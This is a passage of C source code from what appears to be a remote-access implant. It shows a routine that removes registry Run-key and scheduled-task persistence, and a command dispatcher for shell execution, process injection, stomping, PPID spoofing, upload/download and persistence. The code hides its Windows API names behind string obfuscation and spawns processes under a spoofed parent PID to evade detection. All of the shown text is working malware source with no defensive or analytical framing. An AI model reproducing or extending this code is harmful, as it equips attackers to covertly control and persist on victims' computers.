            g_GetProcAddress(adv, OBFSTR("RegOpenKeyExA"));
        pfnRegDeleteValueA_t pDel   = (pfnRegDeleteValueA_t)(FARPROC)
            g_GetProcAddress(adv, OBFSTR("RegDeleteValueA"));
        pfnRegCloseKey_t     pClose = (pfnRegCloseKey_t)(FARPROC)
            g_GetProcAddress(adv, OBFSTR("RegCloseKey"));

        if (!pOpen || !pDel || !pClose) { result = ErrorResult(cmd, "reg API unavailable"); goto rdone; }

        HKEY hKey = NULL;
        LONG rc = pOpen((HKEY)0x80000001,
                        OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                        0, 0x0002, &hKey);
        if (rc != 0 || !hKey) { result = ErrorResult(cmd, "RegOpenKeyEx failed"); goto rdone; }

        rc = pDel(hKey, name);
        pClose(hKey);
        result = (rc == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("reg persist removed"))
                           : ErrorResult(cmd, "RegDeleteValue failed");

    } else if (strcmp(method, "schtask") == 0) {
        char taskCmd[PATH_MAX_C + 64];
        xsnprintf(taskCmd, sizeof(taskCmd),
                  "cmd.exe /C schtasks /Delete /F /TN \"%s\"", name);

        HANDLE hProc = NULL, hThr = NULL;
        BOOL ok = _CreateProcessWithPPID(taskCmd, &hProc, &hThr, NULL, NULL);
        if (ok) {
            WaitForSingleObject(hProc, 10000);
            DWORD ec = 1;
            GetExitCodeProcess(hProc, &ec);
            CloseHandle(hThr);
            CloseHandle(hProc);
            result = (ec == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("schtask removed"))
                               : ErrorResult(cmd, "schtasks delete returned error");
        } else {
            result = ErrorResult(cmd, "CreateProcess failed");
        }

    } else {
        result = ErrorResult(cmd, "unknown method (use reg or schtask)");
    }

rdone:
    ImplantFree(method);
    ImplantFree(name);
    return result;
}

/* ── Dispatcher ──────────────────────────────────────────────────────────── */

AgentResult *ExecuteCommand(const AgentCommand *cmd) {
    if (!cmd || !cmd->type[0]) return NULL;

    if (strcmp(cmd->type, "shell")          == 0) return CmdShell(cmd);
    if (strcmp(cmd->type, "ps")             == 0) return CmdPS(cmd);
    if (strcmp(cmd->type, "cd")             == 0) return CmdCD(cmd);
    if (strcmp(cmd->type, "sleep")          == 0) return CmdSleep(cmd);
    if (strcmp(cmd->type, "kill")           == 0) return CmdKill(cmd);
    if (strcmp(cmd->type, "ppid")           == 0) return CmdPPID(cmd);
    if (strcmp(cmd->type, "getpid")         == 0) return CmdGetPID(cmd);
    if (strcmp(cmd->type, "whoami")         == 0) return CmdWhoami(cmd);
    if (strcmp(cmd->type, "inject")         == 0) return CmdInject(cmd);
    if (strcmp(cmd->type, "stomp")          == 0) return CmdStomp(cmd);
    if (strcmp(cmd->type, "ul")             == 0) return CmdUpload(cmd);
    if (strcmp(cmd->type, "dl")             == 0) return CmdDownload(cmd);
    if (strcmp(cmd->type, "persist")        == 0) return CmdPersist(cmd);
    if (strcmp(cmd->type, "remove_persist") == 0) return CmdRemovePersist(cmd);

    char msg[64];
    xsnprintf(msg, sizeof(msg), "unknown command: %s", cmd->type);
    return ErrorResult(cmd, msg);
}
